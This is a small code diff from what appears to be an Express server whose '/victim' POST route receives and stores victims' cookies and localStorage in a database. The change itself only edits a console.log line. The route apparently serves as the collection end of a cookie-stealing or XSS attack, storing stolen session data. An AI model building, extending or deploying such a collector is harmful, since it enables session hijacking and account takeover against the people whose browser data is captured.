@@ -24,7 +24,7 @@ app.use(express.static("./public"));
 app.post("/victim", async (req, res) => {
   const { cookies, localStorage } = req.body;
 
-  console.log(req.body);
+  console.log(req.body, "running");
 
   const victim = await Victim.create({
     localStorage: localStorage,
